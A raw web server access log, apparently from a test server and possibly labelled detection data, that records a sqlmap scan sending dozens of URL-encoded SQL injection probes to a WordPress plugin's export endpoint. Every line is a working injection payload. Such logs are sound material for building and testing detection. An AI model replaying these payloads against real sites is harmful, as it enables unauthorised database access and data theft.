1
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20IN%20BOOLEAN%20MODE%29%20AND%209961%3D1319%23&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9794&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4557%29%20OR%208306%3D1160--%20MFEh&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7526%29%20OR%207981%3D7981--%20ggkK&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6801%27%29%20OR%203379%3D3708--%20pEru&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4729%27%29%20OR%207981%3D7981--%20AflP&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4751%27%20OR%209928%3D1946--%20lcnX&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-8318%27%20OR%207981%3D7981--%20BOVY&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9936%22%20OR%206808%3D8672--%20eJxj&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9817%22%20OR%207981%3D7981--%20cIBW&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-5216%29%20OR%207374%3D9218%20AND%20%284165%3D4165&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1915%29%20OR%207981%3D7981%20AND%20%284931%3D4931&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:08 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-5601%29%29%20OR%201897%3D7206%20AND%20%28%283129%3D3129&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1647%29%29%20OR%207981%3D7981%20AND%20%28%282128%3D2128&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9744%29%29%29%20OR%205322%3D5363%20AND%20%28%28%288765%3D8765&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-3207%29%29%29%20OR%207981%3D7981%20AND%20%28%28%286058%3D6058&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-3914%20OR%206551%3D8446&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9410%20OR%207981%3D7981&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6416%27%29%20OR%205972%3D2928%20AND%20%28%27bcYr%27%3D%27bcYr&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4801%27%29%20OR%207981%3D7981%20AND%20%28%27tYcE%27%3D%27tYcE&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-2938%27%29%29%20OR%203247%3D1159%20AND%20%28%28%27puDJ%27%3D%27puDJ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6143%27%29%29%20OR%207981%3D7981%20AND%20%28%28%27yaFY%27%3D%27yaFY&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9949%27%29%29%29%20OR%208500%3D4637%20AND%20%28%28%28%27hbyi%27%3D%27hbyi&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-2911%27%29%29%29%20OR%207981%3D7981%20AND%20%28%28%28%27KJLT%27%3D%27KJLT&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:09 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6893%27%20OR%202202%3D8802%20AND%20%27OVhO%27%3D%27OVhO&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4567%27%20OR%207981%3D7981%20AND%20%27STWW%27%3D%27STWW&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9224%27%29%20OR%203101%3D3958%20AND%20%28%27bDWW%27%20LIKE%20%27bDWW&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-2006%27%29%20OR%207981%3D7981%20AND%20%28%27JTaY%27%20LIKE%20%27JTaY&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9024%27%29%29%20OR%203687%3D6533%20AND%20%28%28%27AULH%27%20LIKE%20%27AULH&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1377%27%29%29%20OR%207981%3D7981%20AND%20%28%28%27cgpI%27%20LIKE%20%27cgpI&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-3526%27%29%29%29%20OR%206829%3D7442%20AND%20%28%28%28%27oPmk%27%20LIKE%20%27oPmk&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-5834%27%29%29%29%20OR%207981%3D7981%20AND%20%28%28%28%27Qwac%27%20LIKE%20%27Qwac&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7685%25%27%20OR%205456%3D6562%20AND%20%27kPsz%25%27%3D%27kPsz&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7662%25%27%20OR%207981%3D7981%20AND%20%27AtND%25%27%3D%27AtND&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7398%27%20OR%204397%3D5831%20AND%20%27mmwq%27%20LIKE%20%27mmwq&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1158%27%20OR%207981%3D7981%20AND%20%27pyAF%27%20LIKE%20%27pyAF&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1315%22%29%20OR%204760%3D5153%20AND%20%28%22VptU%22%3D%22VptU&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:10 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1891%22%29%20OR%207981%3D7981%20AND%20%28%22iYLJ%22%3D%22iYLJ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-9945%22%29%29%20OR%203681%3D2318%20AND%20%28%28%22fWDo%22%3D%22fWDo&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7418%22%29%29%20OR%207981%3D7981%20AND%20%28%28%22YaXx%22%3D%22YaXx&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-8828%22%29%29%29%20OR%207464%3D4419%20AND%20%28%28%28%22OvQt%22%3D%22OvQt&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6820%22%29%29%29%20OR%207981%3D7981%20AND%20%28%28%28%22zQqo%22%3D%22zQqo&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7599%22%20OR%206413%3D2298%20AND%20%22UUtN%22%3D%22UUtN&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-5661%22%20OR%207981%3D7981%20AND%20%22ODqq%22%3D%22ODqq&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7749%22%29%20OR%203529%3D4980%20AND%20%28%22aCBZ%22%20LIKE%20%22aCBZ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7056%22%29%20OR%207981%3D7981%20AND%20%28%22sAYG%22%20LIKE%20%22sAYG&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7896%22%29%29%20OR%207325%3D4717%20AND%20%28%28%22HSlC%22%20LIKE%20%22HSlC&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-4174%22%29%29%20OR%207981%3D7981%20AND%20%28%28%22wWez%22%20LIKE%20%22wWez&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-8544%22%29%29%29%20OR%209006%3D2446%20AND%20%28%28%28%22TmoZ%22%20LIKE%20%22TmoZ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7026%22%29%29%29%20OR%207981%3D7981%20AND%20%28%28%28%22LCuA%22%20LIKE%20%22LCuA&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:11 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-3108%22%20OR%209970%3D7286%20AND%20%22kMkB%22%20LIKE%20%22kMkB&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-3235%22%20OR%207981%3D7981%20AND%20%22oVHu%22%20LIKE%20%22oVHu&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-6369%20OR%202072%3D5537--%20pbdd&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-3324%20OR%207981%3D7981--%20FLjE&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7049%20OR%208296%3D6660%23%20mAZu&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-2364%20OR%207981%3D7981%23%20KFgq&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-8252%27%20OR%203435%3D1901%20OR%20%27GOTC%27%3D%27mXrq&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7889%27%20OR%207981%3D7981%20OR%20%27TEpS%27%3D%27qKxU&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-7570%27%29%20WHERE%205093%3D5093%20OR%202454%3D4187--%20RLQy&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-5091%27%29%20WHERE%205371%3D5371%20OR%207981%3D7981--%20LhaR&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-1759%22%29%20WHERE%206098%3D6098%20OR%206395%3D1730--%20ihLM&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:12 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=-2080%22%29%20WHERE%203320%3D3320%20OR%207981%3D7981--%20ZTCe&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
